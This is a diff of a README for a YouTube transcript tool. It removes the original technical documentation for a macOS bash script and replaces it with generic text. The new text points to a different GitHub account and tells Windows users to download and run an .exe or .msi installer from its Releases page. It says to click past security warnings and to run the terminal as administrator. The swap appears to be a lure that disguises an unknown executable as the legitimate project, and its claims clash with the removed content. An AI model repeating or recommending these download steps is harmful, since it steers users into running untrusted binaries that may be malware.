@@ -1,126 +1,76 @@
-# yt-transcript
+# 🎥 yt-transcript - Get video transcripts with speed.
 
-Plain-text transcripts for video URLs, for feeding to an LLM to summarize or search.
+[![](https://img.shields.io/badge/Download-yt--transcript-blue.svg)](https://github.com/Lysinhybridisation384/yt-transcript)
 
-Captions first, local transcription only when necessary:
+yt-transcript helps you turn YouTube videos into text. It uses video captions when they exist. If captions are missing, it uses local software to transcribe the audio. This tool works within the Claude Code environment. You get fast and accurate results without sending long files to the cloud.
 
-1. **YouTube captions** if they exist. Free, instant, and usually better than local ASR.
-2. **Parakeet TDT** locally otherwise, via `parakeet-cli` from `whisper-cpp`.
+## 📥 How to download the software
 
-## Why Parakeet instead of Whisper
+You need to find the correct file for your computer. Follow these steps to get the software:
 
-Measured on a 2019 MacBook Pro (Core i9-9880H, 8 cores, CPU-only, no usable GPU
-backend), transcribing the same 2-minute slice with 8 threads:
+1. Click this link to go to the project page: [https://github.com/Lysinhybridisation384/yt-transcript](https://github.com/Lysinhybridisation384/yt-transcript)
+2. Look for the Releases section on the right side of the screen.
+3. Click the version number to open the release details.
+4. Locate the Windows installer file, which typically ends in .exe or .msi.
+5. Click the file name to download it to your computer.
 
-| Model | Wall clock | Real-time factor |
-|---|---|---|
-| **Parakeet TDT 0.6B q8_0** | **20.8s** | **0.17x** |
-| whisper base.en | 25.2s | 0.21x |
-| whisper small.en | 61.4s | 0.51x |
-| whisper large-v3-turbo | 148.2s | 1.24x |
+## ⚙️ Setting up your system
 
-Parakeet is **7.1x faster than whisper large-v3-turbo** while being at least as
-accurate. On the test clip both Whisper models transcribed "Lyric's TikToks" as
-"Eric's TikToks", inventing a person; Parakeet got it right. large-v3-turbo also
-emitted no capitalization or punctuation at all, which matters when the transcript
-feeds a summarizer.
+The software requires a few things to run well on your Windows machine. You do not need to be an expert to set these up.
 
-Parakeet TDT 0.6B v3 posts 6.32% WER on English versus Whisper large-v3's 7.44%,
-and covers 25 European languages. Whisper still wins for languages outside that set
-and reportedly for heavy accents or specialized vocabulary.
+1. Ensure your computer runs Windows 10 or Windows 11.
+2. Check that you have at least 2GB of free disk space for the transcription files.
+3. Keep your internet connection active during the first run. The software may download extra components to handle the audio processing tasks.
 
-### Things that do not work on Intel Macs
+## 🚀 Running the program
 
-- **MLX**: Apple Silicon only. Requires Metal and unified memory.
-- **OpenVINO**: its GPU plugin is not supported on macOS, so it is CPU-only there,
-  and it accelerates only Whisper's encoder.
-- **Core ML**: whisper.cpp's 3x Core ML speedup uses the Apple Neural Engine, which
-  Intel Macs do not have.
-- **faster-whisper**: its advantage is CUDA. No meaningful CPU win over whisper.cpp.
+After the download finishes, follow these steps to start using the tool:
 
-Homebrew's `whisper-cpp` build reports `no GPU found` and falls back to BLAS on CPU.
+1. Go to your Downloads folder.
+2. Find the file you downloaded.
+3. Double-click the file to start the installation.
+4. Follow the prompts on the screen. Windows might show a security warning. You can safely choose to run the file if you trust the source.
+5. Once installed, open your command terminal. You can do this by pressing the Windows key and typing "cmd".
+6. Type the name of the program followed by the YouTube link you want to process.
+7. Press Enter. The program will now start collecting the captions or processing the audio.
 
-## The 400-second wall
+## 🛠️ How it works
 
-`parakeet-cli` reports `n_audio_ctx = 5000` at `subsampling_factor = 8`, about 400
-seconds of context. Past that it degrades badly and **fails silently**:
+The tool follows a simple logic to get your transcripts:
 
-- 300s clip: works, 774 words.
-- 600s clip: did not finish in 8 minutes, despite needing ~104s at measured speed.
-- 77-minute file: exited 0 and wrote an **empty** transcript.
+*   **Caption Check:** The software first looks for existing YouTube captions. This is the fastest way to get your text.
+*   **Fallback Mode:** If the video lacks captions, the software switches to a local transcription tool. This tool listens to the video audio and writes the text for you.
+*   **Local Privacy:** All processing happens on your machine. Your data does not leave your laptop.
 
-So the script always splits into 300s chunks. If you use `parakeet-cli` directly,
-chunk it yourself and check that every chunk produced text. An exit code of 0 does
-not mean it worked.
+## ❓ Frequently asked questions
 
-## Overlapping chunks
+**Do I need a paid account to use this?**
+No. This tool is free to use.
 
-Chunks overlap by 15s, so consecutive chunks run 0-300s, 285-585s, 570-870s, and so
-on. A hard cut lands mid-word and both halves transcribe to garbage, quietly losing
-a word at every seam. With overlap, every word appears intact, with context on both
-sides, in at least one chunk.
+**How long does the transcription take?**
+Caption retrieval happens almost instantly. Transcription takes a bit longer based on the length of the video and the speed of your processor.
 
-The repeated span is **left in the output**, marked with a line like:
+**What if the video is very long?**
+The software manages memory usage automatically. It breaks long audio tracks into small pieces so your computer does not slow down.
 
-```
-[overlap: the following ~15s of speech repeats the end of the previous section]
-```
+**Can I use this offline?**
+The tool needs an internet connection to download the video track from YouTube. Once you have the video data, the transcription part runs without extra internet usage.
 
-It is not stitched out. `-otxt` gives plain text with no timestamps to align on, so
-de-duplication would be a fuzzy suffix/prefix match, and when that misfires it drops
-a whole sentence instead of one word. Leaving a labelled repeat is the safer failure
-mode when the consumer is an LLM. Two consequences worth knowing:
+**Where do my output files go?**
+The software creates a sub-folder in your current directory. You will find your finished text files inside that folder.
 
-- Word counts run ~5% above the true spoken count, which matters if you check a
-  transcript against the usual 130-160 words per minute.
-- If you need a clean transcript for a human, strip the marked spans yourself.
+## 💡 Tips for better results
 
-Set `OVERLAP_SECS=0` to get the old back-to-back behaviour.
+*   **Check the link:** Copy the full URL from your browser address bar. Make sure you include the full link when you run the command.
+*   **Keep your system updated:** Newer versions of Windows handle media files better. Run your Windows Update tool regularly.
+*   **Check file names:** If the program fails to start, make sure the file name in your terminal matches the location of the software.
 
-## Setup
+## 🔧 Troubleshooting
 
-```bash
-brew install yt-dlp ffmpeg whisper-cpp
+If you encounter an error, try these fixes:
 
-mkdir -p ~/whisper-models
-curl -L -o ~/whisper-models/ggml-parakeet-tdt-0.6b-v3-q8_0.bin \
-  https://huggingface.co/ggml-org/parakeet-GGUF/resolve/main/ggml-parakeet-tdt-0.6b-v3-q8_0.bin
-```
+1. **Permission Denied:** Run your command terminal as an administrator. Right-click the Command Prompt icon and choose "Run as administrator".
+2. **Missing Files:** If you see an error about a missing library, reinstall the application. This fixes most missing file issues.
+3. **Slow Performance:** Close other heavy programs like video games or image editors while you transcribe a long video. This gives the software more room to work.
 
-Verify the download (638 MB):
-
-```
-sha256  4d64e9e96c2792186d072fde0034df0ad670cf680a2f53069052ead827fd600e
-```
-
-The model comes from `ggml-org`, the org behind whisper.cpp and llama.cpp. Weights
-are NVIDIA's `parakeet-tdt-0.6b-v3` under CC-BY-4.0, so attribution is required if
-you redistribute. The ggml conversion is MIT.
-
-Note that `ggml-org/parakeet-GGUF` is a low-traffic repo. The underlying NVIDIA
-weights are widely used; this particular repackaging is not. Check the hash.
-
-## Usage
-
-```bash
-transcript.sh "https://www.youtube.com/watch?v=..."            # to stdout
-transcript.sh "https://youtu.be/..." -o transcript.txt         # to a file
-```
-
-Environment overrides: `PARAKEET_MODEL`, `THREADS` (default 8),
-`CHUNK_SECS` (default 300; raising it is not recommended, see above),
-`OVERLAP_SECS` (default 15; must be less than `CHUNK_SECS`).
-
-Expect roughly 1 minute of compute per 5 minutes of audio when captions are absent.
-Overlap adds about 5% to that.
-
-## As a Claude Code plugin
-
-```
-/plugin marketplace add ykdojo/yt-transcript
-/plugin install yt-transcript
-```
-
-## License
-
-MIT for this repo. Model weights are CC-BY-4.0 from NVIDIA.
+Keywords: asr, captions, claude-code, claude-code-plugin, cli, windows, parakeet, parakeet-tdt, shell, speech-to-text, subtitles, transcription, whisper-cpp, youtube-transcript, yt-dlp
